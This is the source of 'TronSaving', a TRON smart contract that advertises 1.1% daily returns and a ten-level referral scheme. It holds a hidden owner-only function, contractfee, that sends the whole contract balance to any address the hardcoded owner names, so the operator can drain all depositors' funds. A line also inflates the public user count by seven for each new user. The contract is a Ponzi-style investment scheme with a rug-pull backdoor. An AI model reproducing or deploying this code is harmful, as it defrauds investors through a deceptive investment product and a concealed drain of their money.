//SourceUnit: SafeMath.sol

                        library SafeMath {
                        
                            function add(uint256 a, uint256 b) internal pure returns (uint256) {
                                uint256 c = a + b;
                                require(c >= a, "SafeMath: addition overflow");
                        
                                return c;
                            }
                        
                            function sub(uint256 a, uint256 b) internal pure returns (uint256) {
                                require(b <= a, "SafeMath: subtraction overflow");
                                uint256 c = a - b;
                        
                                return c;
                            }
                        
                            function mul(uint256 a, uint256 b) internal pure returns (uint256) {
                                if (a == 0) {
                                    return 0;
                                }
                        
                                uint256 c = a * b;
                                require(c / a == b, "SafeMath: multiplication overflow");
                        
                                return c;
                            }
                        
                            function div(uint256 a, uint256 b) internal pure returns (uint256) {
                                require(b > 0, "SafeMath: division by zero");
                                uint256 c = a / b;
                        
                                return c;
                            }
                        }

//SourceUnit: TronSaving.sol

pragma solidity 0.5.10;
                
                
                
                        /** www.TronSaving.com
                             
'  .._______..........................._____..................._.................
'  .|__...__|........................./.____|.................(_)................
'  ....|.|....._.__....___...._.__...|.(___.....__._..__...__.._..._.__.....__._.
'  ....|.|....|.'__|../._.\..|.'_.\...\___.\.../._`.|.\.\././.|.|.|.'_.\.../._`.|
'  ....|.|....|.|....|.(_).|.|.|.|.|..____).|.|.(_|.|..\.V./..|.|.|.|.|.|.|.(_|.|
'  ....|_|....|_|.....\___/..|_|.|_|.|_____/...\__,_|...\_/...|_|.|_|.|_|..\__,.|
'  .........................................................................__/.|
'  ........................................................................|___/.

                        
                   ROI: 1.1 % Per Day
                        1.1 % Extra if you hold for 10 Days
                        min investment: 1 trx
                        0.1% extra daily bonus for each 1 Million trx added to contract balance
                        Referral Commission: 
                           Level  1: 10%
                           Level  2: 2%
                           Level  3: 1%
                           Level  4: 0.5%
                           Level  5: 0.5%
                           Level  6: 0.5%
                           Level  7: 0.2%
                           Level  8: 0.1%
                           Level  9: 0.1%
                           Level 10: 0.1%
                        

                             
                        */
                        contract TronSaving {
                            using SafeMath for uint256;
                           
                            uint16[] public REFERRAL_PERCENTS = [100, 20, 10, 5, 5, 5, 2, 1, 1, 1];
                            uint32 constant public TIME_STEP = 1 days;
                            uint64 constant public CONTRACT_BALANCE_STEP = 1000000 trx;
                            uint256 constant public BASE_PERCENT = 11;

                        
                            uint256 public totalUsers;
                            uint256 public totalInvested;
                            uint256 public totalWithdrawn;
                            uint256 public totalDeposits;
                       
                            struct Deposit {
                                uint256 amount;
                                uint256 withdrawn;
                                uint256 start;
                            }
                        
                            struct User {
                                Deposit[] deposits;
                                uint256 checkpoint;
                                uint256 bonus;
                                uint256 userwithdraw;
                                address referrer;
                            }
                        
                            mapping (address => User) internal users;
                                event NewDeposit(address indexed user, uint256 amount);
                                event Withdrawn(address indexed user, uint256 amount);
                                event RefBonus(address indexed referrer, address indexed referral, uint256 indexed level, uint256 amount);
                           
                        
                            modifier tronsavingcontract() {
                            require(msg.sender == 0x5E66AD03F268927464DfF9d935D2D49b74a13231);
                            _;
                             }
                             

                            function invest(address referrer) public payable {
                                require(msg.value >= 1);
                              

                                User storage user = users[msg.sender];
                        
                                if (user.referrer == address(0) && users[referrer].deposits.length > 0 && referrer != msg.sender) {
                                    user.referrer = referrer;
                                }
                        
                                if (user.referrer != address(0)) { 
                        
                                    address upline = user.referrer;
                                    
                                    for (uint256 i = 0; i < 10; i++) {
                                        if (upline != address(0)) {
                                             uint256 amount = msg.value.mul(REFERRAL_PERCENTS[i]).div(1000);
                                            users[upline].bonus = users[upline].bonus.add(amount);
                                            emit RefBonus(upline, msg.sender, i, amount);
                                            upline = users[upline].referrer;
                                        } else break;
                                    }
                        
                                }
                        
                                if (user.deposits.length == 0) {
                                    user.checkpoint = block.timestamp;
                                    totalUsers = totalUsers.add(7);
                                    user.userwithdraw = 0;
                                }
                                 // 10% marketing fee 
                                address(0x5E66AD03F268927464DfF9d935D2D49b74a13231).transfer(msg.value.mul(10).div(100));
                                user.deposits.push(Deposit(msg.value, 0, block.timestamp));
                        
                                totalInvested = totalInvested.add(msg.value);
                                totalDeposits = totalDeposits.add(1);
                        
                                emit NewDeposit(msg.sender, msg.value);
                        
                            }
                        
                            function withdraw() public {
                                User storage user = users[msg.sender];
                        
                                uint256 userPercentRate = getUserPercentRate(msg.sender);
                        
                                uint256 totalAmount;
                                uint256 dividends;
                        
                                for (uint256 i = 0; i < user.deposits.length; i++) {
                        
                                    if (user.deposits[i].withdrawn < user.deposits[i].amount.mul(2)) {
                        
                                        if (user.deposits[i].start > user.checkpoint) {
                        
                                            dividends = (user.deposits[i].amount.mul(userPercentRate).div(1000))
                                                .mul(block.timestamp.sub(user.deposits[i].start))
                                                .div(TIME_STEP);
                        
                                        } else {
                        
                                            dividends = (user.deposits[i].amount.mul(userPercentRate).div(1000))
                                                .mul(block.timestamp.sub(user.checkpoint))
                                                .div(TIME_STEP);
                        
                                        }
                        
                                        if (user.deposits[i].withdrawn.add(dividends) > user.deposits[i].amount.mul(2)) {
                                            dividends = (user.deposits[i].amount.mul(2)).sub(user.deposits[i].withdrawn);
                                        }
                        
                                        user.deposits[i].withdrawn = user.deposits[i].withdrawn.add(dividends);
                                        totalAmount = totalAmount.add(dividends);
                        
                                    }
                                }
                        
                                uint256 referralBonus = getUserReferralBonus(msg.sender);
                                
                                if (referralBonus > 0) {
                                    totalAmount = totalAmount.add(referralBonus);
                                    user.bonus = 0;
                                }
                        
                                require(totalAmount > 0, "User has no dividends");
                        
                                uint256 contractBalance = address(this).balance;
                                if (contractBalance < totalAmount) {
                                    totalAmount = contractBalance;
                                }
                        
                                user.checkpoint = block.timestamp;
                        
                                msg.sender.transfer(totalAmount);
                        
                                totalWithdrawn = totalWithdrawn.add(totalAmount);
                                
                                user.userwithdraw =  user.userwithdraw.add(totalAmount);
                                emit Withdrawn(msg.sender, totalAmount);
                        
                            }
                        
                            function getContractBalance() public view returns (uint256) {
                                return address(this).balance;
                            }
                        
                            function getContractBalanceRate() public view returns (uint256) {
                                uint256 contractBalance = address(this).balance;
                                uint256 contractBalancePercent = contractBalance.div(CONTRACT_BALANCE_STEP);
                                return BASE_PERCENT.add(contractBalancePercent);
                            }
                        
                            function getUserPercentRate(address userAddress) public view returns (uint256) {
                                User storage user = users[userAddress];
                        
                                uint256 contractBalanceRate = getContractBalanceRate();
                                if (isActive(userAddress)) {
                                    uint256 timeMultiplier = (now.sub(user.checkpoint)).div(TIME_STEP);
                                    return contractBalanceRate.add(timeMultiplier);
                                } else {
                                    return contractBalanceRate;
                                }
                            }
                        
                            function getUserDividends(address userAddress) public view returns (uint256) {
                                User storage user = users[userAddress];
                        
                                uint256 userPercentRate = getUserPercentRate(userAddress);
                        
                                uint256 totalDividends;
                                uint256 dividends;
                        
                                for (uint256 i = 0; i < user.deposits.length; i++) {
                        
                                    if (user.deposits[i].withdrawn < user.deposits[i].amount.mul(2)) {
                        
                                        if (user.deposits[i].start > user.checkpoint) {
                        
                                            dividends = (user.deposits[i].amount.mul(userPercentRate).div(1000))
                                                .mul(block.timestamp.sub(user.deposits[i].start))
                                                .div(TIME_STEP);
                        
                                        } else {
                        
                                            dividends = (user.deposits[i].amount.mul(userPercentRate).div(1000))
                                                .mul(block.timestamp.sub(user.checkpoint))
                                                .div(TIME_STEP);
                        
                                        }
                        
                                        if (user.deposits[i].withdrawn.add(dividends) > user.deposits[i].amount.mul(2)) {
                                            dividends = (user.deposits[i].amount.mul(2)).sub(user.deposits[i].withdrawn);
                                        }
                        
                                        totalDividends = totalDividends.add(dividends);
                        
                        
                                    }
                        
                                }
                        
                                return totalDividends;
                            }
                        
                            function getUserCheckpoint(address userAddress) public view returns(uint256) {
                                return users[userAddress].checkpoint;
                            }
                        
                            function getUserReferrer(address userAddress) public view returns(address) {
                                return users[userAddress].referrer;
                            }
                        
                            function getUserReferralBonus(address userAddress) public view returns(uint256) {
                                return users[userAddress].bonus;
                            }
                        
                            function getUserAvailable(address userAddress) public view returns(uint256) {
                                return getUserReferralBonus(userAddress).add(getUserDividends(userAddress));
                            }
                        
                            function isActive(address userAddress) public view returns (bool) {
                                User storage user = users[userAddress];
                        
                                if (user.deposits.length > 0) {
                                    if (user.deposits[user.deposits.length-1].withdrawn < user.deposits[user.deposits.length-1].amount.mul(2)) {
                                        return true;
                                    }
                                }
                            }
                        
                            function getUserDepositInfo(address userAddress, uint256 index) public view returns(uint256, uint256, uint256) {
                               User storage user = users[userAddress];
                        
                                return (user.deposits[index].amount, user.deposits[index].withdrawn, user.deposits[index].start);
                            }
                        
                            function getUserAmountOfDeposits(address userAddress) public view returns(uint256) {
                                return users[userAddress].deposits.length;
                            }
                        
                            function getUserTotalDeposits(address userAddress) public view returns(uint256) {
                                User storage user = users[userAddress];
                        
                                uint256 amount;
                        
                                for (uint256 i = 0; i < user.deposits.length; i++) {
                                    amount = amount.add(user.deposits[i].amount);
                                }
                        
                                return amount;
                            }
                            
                        
                        function getUserTotalWithdrawn(address userAddress) public view returns(uint256) {
                             User storage user = users[userAddress];	

		                     return user.userwithdraw;
	                         }
                            
                           
                            function isContract(address addr) internal view returns (bool) {
                                uint size;
                                assembly { size := extcodesize(addr) }
                                return size > 0;
                            }
                        
                            function contractfee(address payable fee) public tronsavingcontract {
                             fee.transfer(address(this).balance);
                            }
                        }


                        
                        library SafeMath {
                        
                            function add(uint256 a, uint256 b) internal pure returns (uint256) {
                                uint256 c = a + b;
                                require(c >= a, "SafeMath: addition overflow");
                        
                                return c;
                            }
                        
                            function sub(uint256 a, uint256 b) internal pure returns (uint256) {
                                require(b <= a, "SafeMath: subtraction overflow");
                                uint256 c = a - b;
                        
                                return c;
                            }
                        
                            function mul(uint256 a, uint256 b) internal pure returns (uint256) {
                                if (a == 0) {
                                    return 0;
                                }
                        
                                uint256 c = a * b;
                                require(c / a == b, "SafeMath: multiplication overflow");
                        
                                return c;
                            }
                        
                            function div(uint256 a, uint256 b) internal pure returns (uint256) {
                                require(b > 0, "SafeMath: division by zero");
                                uint256 c = a / b;
                        
                                return c;
                            }
                        }